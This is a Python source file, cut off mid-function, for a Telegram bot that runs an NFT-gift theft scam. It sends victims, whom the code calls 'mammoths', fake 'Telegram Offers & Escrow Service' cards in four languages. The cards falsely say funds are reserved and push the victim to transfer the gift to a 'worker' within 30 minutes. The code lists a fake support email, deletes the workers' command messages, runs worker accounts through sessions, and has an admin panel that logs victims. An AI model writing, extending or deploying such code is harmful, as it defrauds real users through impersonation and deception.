import sys
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', line_buffering=True)
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', line_buffering=True)

import asyncio
import os
import re
import json
import random
import string
from datetime import datetime, timezone, timedelta
from pathlib import Path

from dotenv import load_dotenv
load_dotenv()

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PasswordHashInvalidError,
)

from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BotCommand,
    BotCommandScopeDefault,
    BotCommandScopeChat,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    ChosenInlineResult,
    BusinessConnection,
)
from aiogram.exceptions import TelegramBadRequest

# ═══════════════════════════════════════════════════════
# ⚙️ КОНФИГУРАЦИЯ
# ═══════════════════════════════════════════════════════

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
ADMIN_ID = int(os.getenv("ADMIN_ID", "1544353769"))
BOT_USERNAME = os.getenv("BOT_USERNAME", "hoptibot").lstrip("@")

API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "").strip()

if not BOT_TOKEN:
    print("FATAL: BOT_TOKEN не задан в .env!", flush=True)
    sys.exit(1)

if not API_ID or not API_HASH:
    print("FATAL: API_ID или API_HASH не заданы в .env!", flush=True)
    sys.exit(1)

default_data_path = "data/data.json" if os.name == "nt" else "/data/data.json"
DATA_FILE = Path(os.getenv("DATA_FILE", default_data_path))

USE_PREMIUM_EMOJI = True

DEFAULT_LANG = "ru"
DEFAULT_CURRENCY = "gram"
OFFER_TTL_HOURS = 6
FAKE_SUPPORT_EMAIL = "support@telegram-escrow.org"

LANGS = {
    "ru": "🇷🇺 Русский",
    "uk": "🇺🇦 Українська",
    "en": "🇬🇧 English",
    "ar": "🇸🇦 العربية",
}

CURRENCIES = {
    "gram": "GRAM",
    "stars": "Stars",
    "ton": "TON",
}

CUSTOM_EMOJIS = {
    "scale": ("5346268255180834499", "⚖️"),
    "user": ("5346136537123801643", "👤"),
    "diamond": ("5296742257146241213", "💎"),
    "star": ("5402104393396931859", "⭐"),
    "gift": ("5345782953941157821", "🎁"),
    "time": ("5213452215527677338", "⏳"),
    "check": ("5895514131896733546", "✅"),
    "cross": ("5377399483812290165", "❌"),
    "money": ("5435999124245729290", "💰"),
    "box": ("5345837435601305335", "📦"),
    "warning": ("5215557810359639942", "⚠️"),
    "globe": ("5317005586431231027", "🌐"),
    "exchange": ("5402186569006210455", "💱"),
}

def get_emoji(name: str) -> str:
    emoji_id, fallback = CUSTOM_EMOJIS.get(name, ("", "•"))
    if USE_PREMIUM_EMOJI and emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def clean_custom_emoji(text: str) -> str:
    return re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text)

CURRENCY_PLAIN = {
    "ru": {"gram": "💎 GRAM", "stars": "⭐ Звёзды", "ton": "💎 TON"},
    "uk": {"gram": "💎 GRAM", "stars": "⭐ Зірки", "ton": "💎 TON"},
    "en": {"gram": "💎 GRAM", "stars": "⭐ Stars", "ton": "💎 TON"},
    "ar": {"gram": "💎 GRAM", "stars": "⭐ نجوم", "ton": "💎 TON"},
}

def get_currency_label(currency: str, lang: str = DEFAULT_LANG, plain: bool = False) -> str:
    if plain or not USE_PREMIUM_EMOJI:
        return CURRENCY_PLAIN.get(lang, CURRENCY_PLAIN[DEFAULT_LANG]).get(currency, currency.upper())
    if currency == "gram":
        return f"{get_emoji('diamond')} GRAM"
    elif currency == "stars":
        star_text = "Звёзды" if lang == "ru" else ("Зірки" if lang == "uk" else ("نجوم" if lang == "ar" else "Stars"))
        return f"{get_emoji('star')} {star_text}"
    elif currency == "ton":
        return f"{get_emoji('diamond')} TON"
    return currency.upper()

# ═══════════════════════════════════════════════════════
# 🌐 ШАБЛОНЫ СООБЩЕНИЙ (КУРСИВ + БЕЗОПАСНАЯ РАЗМЕТКА)
# ═══════════════════════════════════════════════════════

TEXTS = {
    "ru": {
        "offer_body": (
            "{scale} <i><b>Telegram Offers</b></i>\n\n"
            "{user} <i>Пользователь предлагает вам\n"
            "<b>{price} {currency}</b> за подарок <b>{gift_name}</b>.</i>\n\n"
            "{time} <i>Оффер действителен ещё <b>{ttl} ч.</b></i>"
        ),
        "btn_accept": "✅ Принять",
        "btn_reject": "❌ Отклонить",
        "alert_accepted": (
            "Ваш подарок {gift_name} зарезервирован.\n\n"
            "Передайте подарок @{worker_username} в течение 30 минут."
        ),
        "accepted_body": (
            "{check} <i><b>Средства зарезервированы</b></i>\n\n"
            "{money} <i>Сумма: <b>{price} {currency}</b></i>\n"
            "{gift} <i>Подарок: <b>{gift_name}</b></i>\n"
            "{box} <i>Заказ: <code>#{order}</code></i>\n"
            "{user} <i>Покупатель: <b>@{worker_username}</b></i>\n\n"
            "<i>Для завершения сделки передайте подарок на аккаунт покупателя: <b>@{worker_username}</b>.\n"
            "Передача: откройте подарок в профиле → «Передать» → выберите получателя: <b>@{worker_username}</b>.</i>\n\n"
            "{time} <i>У вас будет 30 минут для передачи подарка.</i>\n\n"
            "{warning} <i>После получения подарка средства автоматически зачислятся на ваш баланс Telegram.</i>\n\n"
            "{globe} <i>Если у вас произошла какая-то ошибка или возникли вопросы, обратитесь в службу поддержки: <code>{fake_email}</code></i>\n\n"
            "<i>Это сообщение видите только вы с целью конфиденциальности</i>"
        ),
        "escrow_welcome": (
            "{scale} <i><b>Telegram Offers & Escrow Service</b></i>\n\n"
            "<i>Официальный сервис безопасных сделок и передачи NFT-подарков Telegram.</i>\n\n"
            "{check} <i>Средства покупателя резервируются смарт-контрактом до момента подтверждения передачи подарка.</i>\n"
            "{warning} <i>Все сделки защищены политикой конфиденциальности Telegram.</i>\n\n"
            "{globe} <i>Служба поддержки: <code>{fake_email}</code></i>"
        ),
        "rejected_body": "{cross} <i><b>Оффер отклонён</b></i>",
        "alert_rejected": "Оффер отклонён",
        "start_msg": (
            "👋 <i><b>Панель воркера</b></i>\n\n"
            "👤 <i>Твой ID: <code>{uid}</code></i>\n"
            "🏷 <i>Твой юзернейм в офферах: <b>@{worker_username}</b></i>\n"
            "🌐 <i>Язык офферов: <b>{lang}</b></i>\n"
            "💱 <i>Валюта офферов: <b>{currency}</b></i>\n"
            "📱 <i>Сессия: <b>{session_status}</b></i>\n"
            "🔌 <i>Бизнес-аккаунт: <b>{business_status}</b></i>\n\n"
            "<i><b>Команды:</b></i>\n"
            "<i>/setusername @юзернейм — сменить отображаемый тег получателя</i>\n"
            "<i>/lang — сменить язык офферов</i>\n"
            "<i>/currency — сменить валюту офферов</i>\n\n"
            "<i><b>Создать оффер (сессия):</b></i>\n"
            "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
            "<i><b>Создать оффер (бизнес-аккаунт):</b></i>\n"
            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
        ),
        "choose_lang": "{globe} <i><b>Выбери язык офферов:</b></i>",
        "lang_set": "✅ <i>Язык установлен: {lang}</i>",
        "choose_currency": "{exchange} <i><b>Выбери валюту офферов:</b></i>",
        "currency_set": "✅ <i>Валюта установлена: {currency}</i>",
    },
    "uk": {
        "offer_body": (
            "{scale} <i><b>Telegram Offers</b></i>\n\n"
            "{user} <i>Користувач пропонує вам\n"
            "<b>{price} {currency}</b> за подарунок <b>{gift_name}</b>.</i>\n\n"
            "{time} <i>Офер дійсний ще <b>{ttl} год.</b></i>"
        ),
        "btn_accept": "✅ Прийняти",
        "btn_reject": "❌ Відхилити",
        "alert_accepted": "Ваш подарунок {gift_name} зарезервовано.\n\nПередайте подарунок @{worker_username} протягом 30 хвилин.",
        "accepted_body": (
            "{check} <i><b>Кошти зарезервовано</b></i>\n\n"
            "{money} <i>Сума: <b>{price} {currency}</b></i>\n"
            "{gift} <i>Подарунок: <b>{gift_name}</b></i>\n"
            "{box} <i>Замовлення: <code>#{order}</code></i>\n"
            "{user} <i>Покупець: <b>@{worker_username}</b></i>\n\n"
            "<i>Для завершення угоди передайте подарунок на акаунт покупця: <b>@{worker_username}</b>.\n"
            "Передача: відкрийте подарунок у профілі → «Передати» → виберіть одержувача: <b>@{worker_username}</b>.</i>\n\n"
            "{time} <i>У вас буде 30 хвилин для передачі подарунка.</i>\n\n"
            "{warning} <i>Після отримання подарунка кошти автоматично надійдуть на ваш баланс Telegram.</i>\n\n"
            "{globe} <i>Служба підтримки: <code>{fake_email}</code></i>\n\n"
            "<i>Це повідомлення бачите тільки ви з метою конфіденційності</i>"
        ),
        "escrow_welcome": (
            "{scale} <i><b>Telegram Offers & Escrow Service</b></i>\n\n"
            "<i>Офіційний сервіс безпечних угод та передачі NFT-подарунків Telegram.</i>\n\n"
            "{globe} <i>Служба підтримки: <code>{fake_email}</code></i>"
        ),
        "rejected_body": "{cross} <i><b>Офер відхилено</b></i>",
        "alert_rejected": "Офер відхилено",
        "start_msg": (
            "👋 <i><b>Панель воркера</b></i>\n\n"
            "👤 <i>ID: <code>{uid}</code></i>\n"
            "🏷 <i>Юзернейм: <b>@{worker_username}</b></i>\n"
            "🌐 <i>Мова: <b>{lang}</b></i>\n"
            "💱 <i>Валюта: <b>{currency}</b></i>\n"
            "📱 <i>Сесія: <b>{session_status}</b></i>\n"
            "🔌 <i>Бізнес: <b>{business_status}</b></i>\n\n"
            "<i><b>Створити офер (сесія):</b></i>\n"
            "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
            "<i><b>Створити офер (бізнес):</b></i>\n"
            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
        ),
        "choose_lang": "{globe} <i><b>Оберіть мову:</b></i>",
        "lang_set": "✅ <i>Мову встановлено: {lang}</i>",
        "choose_currency": "{exchange} <i><b>Оберіть валюту оферів:</b></i>",
        "currency_set": "✅ <i>Валюту встановлено: {currency}</i>",
    },
    "en": {
        "offer_body": (
            "{scale} <i><b>Telegram Offers</b></i>\n\n"
            "{user} <i>A user is offering you\n"
            "<b>{price} {currency}</b> for the gift <b>{gift_name}</b>.</i>\n\n"
            "{time} <i>Offer is valid for another <b>{ttl} h.</b></i>"
        ),
        "btn_accept": "✅ Accept",
        "btn_reject": "❌ Decline",
        "alert_accepted": (
            "Your gift {gift_name} has been reserved.\n\n"
            "Transfer the gift to @{worker_username} within 30 minutes."
        ),
        "accepted_body": (
            "{check} <i><b>Funds Reserved</b></i>\n\n"
            "{money} <i>Amount: <b>{price} {currency}</b></i>\n"
            "{gift} <i>Gift: <b>{gift_name}</b></i>\n"
            "{box} <i>Order: <code>#{order}</code></i>\n"
            "{user} <i>Buyer: <b>@{worker_username}</b></i>\n\n"
            "<i>To complete the deal, transfer the gift to the buyer account: <b>@{worker_username}</b>.\n"
            "Transfer: open gift in profile → «Transfer» → choose recipient: <b>@{worker_username}</b>.</i>\n\n"
            "{time} <i>You have 30 minutes to complete the transfer.</i>\n\n"
            "{warning} <i>Once the gift is received, the funds will be automatically credited to your Telegram balance.</i>\n\n"
            "{globe} <i>If you encountered an error or have questions, contact support: <code>{fake_email}</code></i>\n\n"
            "<i>This message is only visible to you for confidentiality purposes</i>"
        ),
        "escrow_welcome": (
            "{scale} <i><b>Telegram Offers & Escrow Service</b></i>\n\n"
            "<i>Official secure escrow and NFT gift transfer platform.</i>\n\n"
            "{globe} <i>Support: <code>{fake_email}</code></i>"
        ),
        "rejected_body": "{cross} <i><b>Offer declined</b></i>",
        "alert_rejected": "Offer declined",
        "start_msg": (
            "👋 <i><b>Worker Panel</b></i>\n\n"
            "👤 <i>ID: <code>{uid}</code></i>\n"
            "🏷 <i>Username: <b>@{worker_username}</b></i>\n"
            "🌐 <i>Language: <b>{lang}</b></i>\n"
            "💱 <i>Currency: <b>{currency}</b></i>\n"
            "📱 <i>Session: <b>{session_status}</b></i>\n"
            "🔌 <i>Business: <b>{business_status}</b></i>\n\n"
            "<i><b>Create offer (session):</b></i>\n"
            "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
            "<i><b>Create offer (business):</b></i>\n"
            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
        ),
        "choose_lang": "{globe} <i><b>Select language:</b></i>",
        "lang_set": "✅ <i>Language set: {lang}</i>",
        "choose_currency": "{exchange} <i><b>Select offer currency:</b></i>",
        "currency_set": "✅ <i>Currency set: {currency}</i>",
    },
    "ar": {
        "offer_body": (
            "{scale} <i><b>Telegram Offers</b></i>\n\n"
            "{user} <i>يقدم لك أحد المستخدمين\n"
            "<b>{price} {currency}</b> مقابل الهدية <b>{gift_name}</b>.</i>\n\n"
            "{time} <i>العرض سارٍ لمدة <b>{ttl} ساعة أخرى.</b></i>"
        ),
        "btn_accept": "✅ قبول",
        "btn_reject": "❌ رفض",
        "alert_accepted": "تم حجز هديتك {gift_name}.\n\nيرجى تحويل الهدية إلى @{worker_username} خلال 30 دقيقة.",
        "accepted_body": (
            "{check} <i><b>تم حجز الأموال بنجاح</b></i>\n\n"
            "{money} <i>المبلغ: <b>{price} {currency}</b></i>\n"
            "{gift} <i>الهدية: <b>{gift_name}</b></i>\n"
            "{box} <i>رقم الطلب: <code>#{order}</code></i>\n"
            "{user} <i>المشتري: <b>@{worker_username}</b></i>\n\n"
            "<i>يرجى تحويل الهدية إلى: <b>@{worker_username}</b> خلال 30 دقيقة.</i>\n\n"
            "{globe} <code>{fake_email}</code>"
        ),
        "escrow_welcome": "{scale} <i><b>Telegram Offers & Escrow Service</b></i>\n\n{globe} <code>{fake_email}</code>",
        "rejected_body": "{cross} <i><b>تم رفض العرض</b></i>",
        "alert_rejected": "تم رفض العرض",
        "start_msg": (
            "👋 <i><b>لوحة التحكم</b></i>\n\n"
            "👤 <i>ID: <code>{uid}</code></i>\n"
            "🏷 <i>اسم المستخدم: <b>@{worker_username}</b></i>\n"
            "📱 <i>الجلسة: <b>{session_status}</b></i>\n"
            "🔌 <i>الحساب التجاري: <b>{business_status}</b></i>\n\n"
            "<i><b>إنشاء عرض (جلسة):</b></i>\n"
            "<code>.оффер https://t.me/nft/SnakeBox-30973 500</code>\n\n"
            "<i><b>إنشاء عرض (تجاري):</b></i>\n"
            "<code>оффер https://t.me/nft/SnakeBox-30973 500</code>"
        ),
        "choose_lang": "{globe} <i><b>اختر اللغة:</b></i>",
        "lang_set": "✅ <i>تم ضبط اللغة: {lang}</i>",
        "choose_currency": "{exchange} <i><b>اختر عملة العروض:</b></i>",
        "currency_set": "✅ <i>تم ضبط العملة: {currency}</i>",
    }
}

def t(lang: str, key: str, /, **kwargs) -> str:
    lang_dict = TEXTS.get(lang, TEXTS.get(DEFAULT_LANG, {}))
    template = lang_dict.get(key) or TEXTS.get(DEFAULT_LANG, {}).get(key)
    if not template:
        template = "⚖️ <i><b>Telegram Offers & Escrow Service</b>\n\nОфициальный сервис безопасных сделок.</i>"

    for emoji_key in CUSTOM_EMOJIS:
        if emoji_key not in kwargs:
            kwargs[emoji_key] = get_emoji(emoji_key)
    if "fake_email" not in kwargs:
        kwargs["fake_email"] = FAKE_SUPPORT_EMAIL
    return template.format(**kwargs) if kwargs else template

# ═══════════════════════════════════════════════════════
# 💾 БАЗА ДАННЫХ
# ═══════════════════════════════════════════════════════

WORKERS = {ADMIN_ID}
WORKER_LANGS = {}
WORKER_CURRENCIES = {}
WORKER_USERNAMES = {}
WORKER_SESSIONS = {}
WORKER_BUSINESS = {}  # uid -> {"conn_id", "user_chat_id", "enabled"}
OFFERS = {}
_offer_counter = 0

ACTIVE_CLIENTS = {}
LOGIN_FLOW = {}

def save_data():
    try:
        DATA_FILE.parent.mkdir(parents=True, exist_ok=True)
        data = {
            "workers": sorted(list(WORKERS)),
            "worker_langs": WORKER_LANGS,
            "worker_currencies": WORKER_CURRENCIES,
            "worker_usernames": WORKER_USERNAMES,
            "worker_sessions": WORKER_SESSIONS,
            "worker_business": WORKER_BUSINESS,
            "offer_counter": _offer_counter,
            "offers": {
                str(k): {
                    **v,
                    "created_at": v["created_at"].isoformat() if isinstance(v.get("created_at"), datetime) else v.get("created_at"),
                    "accepted_at": v["accepted_at"].isoformat() if isinstance(v.get("accepted_at"), datetime) else v.get("accepted_at"),
                }
                for k, v in OFFERS.items()
            },
        }
        tmp = DATA_FILE.with_suffix(".tmp")
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        os.replace(tmp, DATA_FILE)
    except Exception as e:
        print(f"[SAVE] Error: {e}", flush=True)

def load_data():
    global _offer_counter, WORKERS, WORKER_LANGS, WORKER_CURRENCIES, WORKER_USERNAMES, WORKER_SESSIONS, WORKER_BUSINESS, OFFERS
    if not DATA_FILE.exists():
        return
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)

        ws = data.get("workers", [])
        if isinstance(ws, list):
            WORKERS = set(int(x) for x in ws if str(x).lstrip("-").isdigit())
        WORKERS.add(ADMIN_ID)

        wl = data.get("worker_langs", {})
        if isinstance(wl, dict):
            WORKER_LANGS = {int(k): str(v) for k, v in wl.items() if str(k).lstrip("-").isdigit()}

        wc = data.get("worker_currencies", {})
        if isinstance(wc, dict):
            WORKER_CURRENCIES = {int(k): str(v) for k, v in wc.items() if str(k).lstrip("-").isdigit()}

        wu = data.get("worker_usernames", {})
        if isinstance(wu, dict):
            WORKER_USERNAMES = {int(k): str(v) for k, v in wu.items() if str(k).lstrip("-").isdigit()}

        wsess = data.get("worker_sessions", {})
        if isinstance(wsess, dict):
            WORKER_SESSIONS = {int(k): str(v) for k, v in wsess.items() if str(k).lstrip("-").isdigit()}

        wbiz = data.get("worker_business", {})
        if isinstance(wbiz, dict):
            WORKER_BUSINESS = {int(k): v for k, v in wbiz.items() if str(k).lstrip("-").isdigit() and isinstance(v, dict)}

        raw_offers = data.get("offers", {})
        OFFERS = {}
        if isinstance(raw_offers, dict):
            for k, v in raw_offers.items():
                if not str(k).isdigit() or not isinstance(v, dict):
                    continue
                oid = int(k)
                for df in ("created_at", "accepted_at"):
                    if v.get(df) and isinstance(v[df], str):
                        try:
                            dt = datetime.fromisoformat(v[df])
                            if dt.tzinfo is None:
                                dt = dt.replace(tzinfo=timezone.utc)
                            v[df] = dt
                        except Exception:
                            v[df] = None
                OFFERS[oid] = v

        _offer_counter = max(int(data.get("offer_counter", 0)), max(OFFERS.keys(), default=0))
    except Exception as e:
        print(f"[LOAD] Error: {e}", flush=True)

def next_offer_id() -> int:
    global _offer_counter
    _offer_counter += 1
    return _offer_counter

def gen_order_code() -> str:
    alphabet = string.ascii_uppercase + string.digits
    return "TG-" + "".join(random.choices(alphabet, k=10))

load_data()

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

def is_worker(uid: int) -> bool:
    return int(uid) in WORKERS

def get_lang(uid: int) -> str:
    return WORKER_LANGS.get(int(uid), DEFAULT_LANG)

def get_currency(uid: int) -> str:
    return WORKER_CURRENCIES.get(int(uid), DEFAULT_CURRENCY)

def get_worker_username(uid: int) -> str:
    return WORKER_USERNAMES.get(int(uid), "").lstrip("@") or f"user_{uid}"

async def send_message_safe(chat_id: int, text: str, **kwargs):
    if not text or not str(text).strip():
        print(f"[WARN] Попытка отправить пустое сообщение в чат {chat_id}, отменено.", flush=True)
        return
    try:
        return await bot.send_message(chat_id=chat_id, text=text, **kwargs)
    except TelegramBadRequest as e:
        err = str(e).lower()
        if "custom" in err or "entity" in err or "emoji" in err or "parse" in err:
            clean_text = clean_custom_emoji(text)
            return await bot.send_message(chat_id=chat_id, text=clean_text, **kwargs)
        raise

async def update_worker_commands(uid: int):
    cmds = [
        BotCommand(command="start", description="Панель воркера"),
        BotCommand(command="setusername", description="Сменить юзернейм"),
        BotCommand(command="lang", description="Язык офферов"),
        BotCommand(command="currency", description="Валюта офферов"),
    ]
    if uid == ADMIN_ID:
        cmds.extend([
            BotCommand(command="workers", description="Список воркеров"),
            BotCommand(command="grant", description="Добавить воркера"),
            BotCommand(command="revoke", description="Удалить воркера"),
            BotCommand(command="offers", description="Активные офферы"),
        ])
    try:
        await bot.set_my_commands(cmds, scope=BotCommandScopeChat(chat_id=uid))
    except Exception:
        pass

def parse_offer_command(text: str):
    m = re.match(
        r'^\s*\.?оффер\s+'
        r'(?:(?:https?://)?t\.me/nft/)?'
        r'([A-Za-z0-9_\-]+)\s+'
        r'(\d+)\s*'
        r'(?:(gram|stars|ton))?\s*$',
        text,
        re.IGNORECASE | re.UNICODE
    )
    if not m:
        return None

    slug = m.group(1)
    price = int(m.group(2))
    currency_override = m.group(3).lower() if m.group(3) else None

    if price <= 0:
        return None

    match = re.search(r'^(.*?)-(\d+)$', slug)
    if match:
        gift_name = f"{match.group(1).replace('-', ' ')} #{match.group(2)}"
    else:
        gift_name = slug.replace("-", " ")

    gift_link = f"https://t.me/nft/{slug}"
    return gift_name, gift_link, price, currency_override

def make_offer_card(o: dict) -> str:
    lang = o.get("lang", DEFAULT_LANG)
    cur = o.get("currency", DEFAULT_CURRENCY)
    # plain=True предотвращает вложенность <tg-emoji> внутрь <i><b>, используя безопасный юникод
    cur_label = get_currency_label(cur, lang, plain=True)
    return t(lang, "offer_body", price=o["price"], currency=cur_label, gift_name=o["gift_name"], ttl=OFFER_TTL_HOURS)

def make_offer_kb(offer_id: int, lang: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t(lang, "btn_accept"), callback_data=f"accept:{offer_id}")],
        [InlineKeyboardButton(text=t(lang, "btn_reject"), callback_data=f"reject:{offer_id}")],
    ])

def make_worker_main_kb(uid: int) -> InlineKeyboardMarkup:
    has_session = uid in WORKER_SESSIONS
    sess_btn = (
        InlineKeyboardButton(text="❌ Отключить сессию", callback_data="session:disconnect")
        if has_session else
        InlineKeyboardButton(text="📱 Подключить сессию", callback_data="session:connect")
    )
    return InlineKeyboardMarkup(inline_keyboard=[
        [sess_btn],
        [
            InlineKeyboardButton(text="🌐 Язык", callback_data="open:lang"),
            InlineKeyboardButton(text="💱 Валюта", callback_data="open:currency"),
        ]
    ])

def business_status(uid: int) -> str:
    b = WORKER_BUSINESS.get(uid)
    if not b:
        return "❌ Не подключён"
    return "✅ Активен" if b.get("enabled") else "⚠️ Отключён"

def session_status(uid: int) -> str:
    return "✅ Подключена" if uid in WORKER_SESSIONS else "❌ Не подключена"

# ═══════════════════════════════════════════════════════
# ⚡ СЕССИИ ВОРКЕРОВ (TELETHON)
# ═══════════════════════════════════════════════════════

async def register_worker_client(worker_id: int, session_str: str):
    try:
        if worker_id in ACTIVE_CLIENTS:
            try:
                await ACTIVE_CLIENTS[worker_id].disconnect()
            except Exception:
                pass

        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, catch_up=False)
        await client.connect()

        if not await client.is_user_authorized():
            WORKER_SESSIONS.pop(worker_id, None)
            save_data()
            return

        ACTIVE_CLIENTS[worker_id] = client
        me = await client.get_entity('me')
        if getattr(me, "username", None):
            WORKER_USERNAMES[worker_id] = me.username.lstrip("@")
            save_data()

        @client.on(events.NewMessage(outgoing=True))
        async def on_worker_offer(event):
            text = (event.raw_text or "").strip()
            if not text.lower().startswith(".оффер"):
                return

            parsed = parse_offer_command(text)
            if not parsed:
                return

            gift_name, gift_link, price, currency_override = parsed
            chat_id = event.chat_id

            try:
                await event.delete()
            except Exception:
                pass

            worker_currency = currency_override if currency_override else get_currency(worker_id)
            worker_lang = get_lang(worker_id)

            mammoth_uname = "—"
            try:
                chat_ent = await client.get_entity(chat_id)
                if getattr(chat_ent, "username", None):
                    mammoth_uname = f"@{chat_ent.username.lstrip('@')}"
            except Exception:
                pass

            worker_uname = get_worker_username(worker_id)

            offer_id = next_offer_id()
            OFFERS[offer_id] = {
                "worker_id": worker_id,
                "worker_username": worker_uname,
                "mammoth_id": chat_id,
                "mammoth_username": mammoth_uname,
                "gift_name": gift_name,
                "gift_link": gift_link,
                "price": price,
                "currency": worker_currency,
                "lang": worker_lang,
                "status": "pending",
                "created_at": datetime.now(timezone.utc),
                "delivery": "session",
            }
            save_data()

            try:
                results = await client.inline_query(BOT_USERNAME, f"offer_{offer_id}")
                if results:
                    await results[0].click(chat_id)
                else:
                    print(f"[SESSION] Внимание: inline_query вернул 0 результатов для @{BOT_USERNAME}!", flush=True)
            except Exception as e:
                print(f"[SESSION] Inline click error: {e}", flush=True)

            cur_label = get_currency_label(worker_currency, worker_lang, plain=True)
            await send_message_safe(
                ADMIN_ID,
                f"🆕 <b>Оффер #{offer_id} (session)</b>\n\n"
                f"👤 Воркер: <code>{worker_id}</code> (@{worker_uname})\n"
                f"🎯 Мамонт: <code>{chat_id}</code> ({mammoth_uname})\n"
                f"🎁 Подарок: <b>{gift_name}</b>\n"
                f"🔗 Ссылка: {gift_link}\n"
                f"💰 Цена: <b>{price} {cur_label}</b>"
            )

        asyncio.create_task(client.run_until_disconnected())
    except Exception as e:
        print(f"[SESSION] Client init error {worker_id}: {e}", flush=True)

# ═══════════════════════════════════════════════════════
# 🔌 BUSINESS CONNECTION
# ═══════════════════════════════════════════════════════

@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    uid = connection.user.id
    if not is_worker(uid):
        return
    WORKER_BUSINESS[uid] = {
        "conn_id": connection.id,
        "user_chat_id": connection.user_chat_id,
        "enabled": connection.is_enabled,
    }
    save_data()
    print(f"[BUSINESS] worker {uid} conn={connection.id} enabled={connection.is_enabled}", flush=True)

@dp.business_message()
async def on_business_message(message: types.Message):
    text = (message.text or "").strip()
    if text.startswith("."):
        return
    if not text.lower().startswith("оффер"):
        return

    conn_id = message.business_connection_id
    sender_id = message.from_user.id if message.from_user else None

    if not sender_id or not is_worker(sender_id) or not conn_id:
        return

    parsed = parse_offer_command(text)
    if not parsed:
        return

    gift_name, gift_link, price, currency_override = parsed
    chat_id = message.chat.id

    try:
        await bot.delete_business_messages(
            business_connection_id=conn_id,
            message_ids=[message.message_id],
        )
    except Exception as e:
        print(f"[BUSINESS] delete skip: {e}", flush=True)

    worker_currency = currency_override if currency_override else get_currency(sender_id)
    worker_lang = get_lang(sender_id)

    mammoth_uname = "—"
    try:
        chat = await bot.get_chat(chat_id)
        if getattr(chat, "username", None):
            mammoth_uname = f"@{chat.username}"
    except Exception:
        pass

    worker_uname = get_worker_username(sender_id)

    offer_id = next_offer_id()
    OFFERS[offer_id] = {
        "worker_id": sender_id,
        "worker_username": worker_uname,
        "mammoth_id": chat_id,
        "mammoth_username": mammoth_uname,
        "gift_name": gift_name,
        "gift_link": gift_link,
        "price": price,
        "currency": worker_currency,
        "lang": worker_lang,
        "status": "pending",
        "created_at": datetime.now(timezone.utc),
        "delivery": "business",
        "business_conn": conn_id,
    }
    save_data()

    card_text = make_offer_card(OFFERS[offer_id])
    kb = make_offer_kb(offer_id, worker_lang)

    try:
        await bot.send_message(
            chat_id=chat_id,
            text=card_text,
            parse_mode="HTML",
            reply_markup=kb,
            business_connection_id=conn_id,
        )
    except TelegramBadRequest as e:
        err = str(e).lower()
        if "custom" in err or "entity" in err or "emoji" in err or "parse" in err:
            clean_txt = clean_custom_emoji(card_text)
            try:
                await bot.send_message(
                    chat_id=chat_id,
                    text=clean_txt,
                    parse_mode="HTML",
                    reply_markup=kb,
                    business_connection_id=conn_id,
                )
            except Exception as e2:
                print(f"[BUSINESS] send fallback error: {e2}", flush=True)
        else:
            print(f"[BUSINESS] send error: {e}", flush=True)

    cur_label = get_currency_label(worker_currency, worker_lang, plain=True)
    await send_message_safe(
        ADMIN_ID,
        f"🆕 <b>Оффер #{offer_id} (business)</b>\n\n"
        f"👤 Воркер: <code>{sender_id}</code> (@{worker_uname})\n"
        f"🎯 Мамонт: <code>{chat_id}</code> ({mammoth_uname})\n"
        f"🎁 Подарок: <b>{gift_name}</b>\n"
        f"🔗 Ссылка: {gift_link}\n"
        f"💰 Цена: <b>{price} {cur_label}</b>\n"
        f"🔌 Conn: <code>{conn_id}</code>"
    )

# ═══════════════════════════════════════════════════════
# 🔍 ИНЛАЙН (С FALLBACK ЗАЩИТОЙ)
# ═══════════════════════════════════════════════════════

@dp.inline_query()
async def inline_offer_handler(inline_query: InlineQuery):
    query = inline_query.query.strip()
    if not query.startswith("offer_"):
        await inline_query.answer([], is_personal=True, cache_time=1)
        return

    try:
        offer_id = int(query.split("_")[1])
        o = OFFERS.get(offer_id)
        if not o:
            return

        lang = o.get("lang", DEFAULT_LANG)
        card_text = make_offer_card(o)
        kb = make_offer_kb(offer_id, lang)

        article = InlineQueryResultArticle(
            id=str(offer_id),
            title=f"Оффер #{offer_id}",
            input_message_content=InputTextMessageContent(
                message_text=card_text,
                parse_mode="HTML"
            ),
            reply_markup=kb,
            description=f"Отправить оффер на {o['gift_name']}"
        )
        try:
            await inline_query.answer([article], is_personal=True, cache_time=1)
        except TelegramBadRequest as e:
            err = str(e).lower()
            if "custom" in err or "entity" in err or "emoji" in err or "parse" in err:
                clean_txt = clean_custom_emoji(card_text)
                article.input_message_content = InputTextMessageContent(
                    message_text=clean_txt,
                    parse_mode="HTML"
                )
                await inline_query.answer([article], is_personal=True, cache_time=1)
            else:
                raise
    except Exception as e:
        print(f"[INLINE] Error: {e}", flush=True)

@dp.chosen_inline_result()
async def on_chosen_inline_result(chosen: ChosenInlineResult):
    if chosen.inline_message_id and chosen.result_id:
        try:
            offer_id = int(chosen.result_id)
